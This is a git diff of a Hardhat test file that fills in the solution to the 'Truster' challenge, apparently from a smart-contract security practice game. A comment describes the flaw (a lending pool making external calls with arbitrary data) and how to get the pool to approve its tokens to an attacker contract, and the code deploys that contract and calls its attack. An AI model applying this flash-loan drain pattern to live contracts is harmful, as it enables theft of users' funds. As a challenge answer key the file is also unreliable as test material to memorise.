@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { AbiCoder, defaultAbiCoder } = require('ethers/lib/utils');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -28,7 +29,19 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        /** EXPLOIT -- SOLVED */
+        /** 
+         * vulnerability: external call with arbitrary data (Line 36, TrusterLenderPool.sol)
+         * 
+         * hack: getting the pool to approve all its tokens to attacker contract (TrusterChallenge.sol),
+         * then transfer those tokens to attacker.address
+         * */
+
+        const TrusterChallenge = await ethers.getContractFactory("TrusterChallenge", attacker);
+        const tc = await TrusterChallenge.deploy();
+        await tc.deployed();
+
+        tc.attack(this.token.address, this.pool.address);
     });
 
     after(async function () {
